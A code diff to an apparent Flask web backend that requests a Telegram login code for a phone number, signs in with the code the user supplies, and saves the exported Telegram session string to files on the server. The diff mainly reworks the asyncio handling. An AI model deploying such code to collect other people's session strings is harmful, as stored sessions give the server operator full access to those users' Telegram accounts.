@@ -37,29 +37,16 @@ def send_code():
 
     try:
         session_name = f"session_{phone.replace('+', '')}"
-        client = Client(session_name, api_id=API_ID, api_hash=API_HASH, in_memory=True)
-        
-        # থ্রেড সেফ ইভেন্ট লুপ হ্যান্ডেলিং
-        try:
-            loop = asyncio.get_event_loop()
-            if loop.is_closed():
-                raise RuntimeError
-        except RuntimeError:
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
         
         async def main():
+            client = Client(session_name, api_id=API_ID, api_hash=API_HASH, in_memory=True)
             await client.connect()
             sent_code = await client.send_code(phone)
-            return sent_code
+            await client.disconnect()
+            return sent_code.phone_code_hash
 
-        sent_code = loop.run_until_complete(main())
-        
-        temp_clients[phone] = {
-            "client": client,
-            "loop": loop,
-            "phone_code_hash": sent_code.phone_code_hash
-        }
+        phone_code_hash = asyncio.run(main())
+        temp_clients[phone] = phone_code_hash
         
         return jsonify({"status": "success", "message": "OTP code sent to Telegram!"})
     except Exception as e:
@@ -77,25 +64,25 @@ def verify_code():
     if phone not in temp_clients:
         return jsonify({"status": "error", "message": "Session expired. Please request code again."}), 400
 
-    user_data = temp_clients[phone]
-    client = user_data["client"]
-    loop = user_data["loop"]
-    phone_code_hash = user_data["phone_code_hash"]
+    phone_code_hash = temp_clients[phone]
 
     try:
+        session_name = f"session_{phone.replace('+', '')}"
+        
         async def verify_main():
+            client = Client(session_name, api_id=API_ID, api_hash=API_HASH, in_memory=True)
+            await client.connect()
             await client.sign_in(phone, phone_code_hash, code)
             session_string = await client.export_session_string()
             
-            # সার্ভারে ইউজারের সেশন ফাইল সেভ করা
             os.makedirs("sessions", exist_ok=True)
             session_filename = f"sessions/{phone.replace('+', '')}.session"
-            with open(session_filename, "w") as f:
+            with open(session_filename, "w", encoding="utf-8") as f:
                 f.write(session_string)
                 
             await client.disconnect()
 
-        loop.run_until_complete(verify_main())
+        asyncio.run(verify_main())
         del temp_clients[phone]
         
         return jsonify({"status": "success", "message": "Session generated successfully!"})
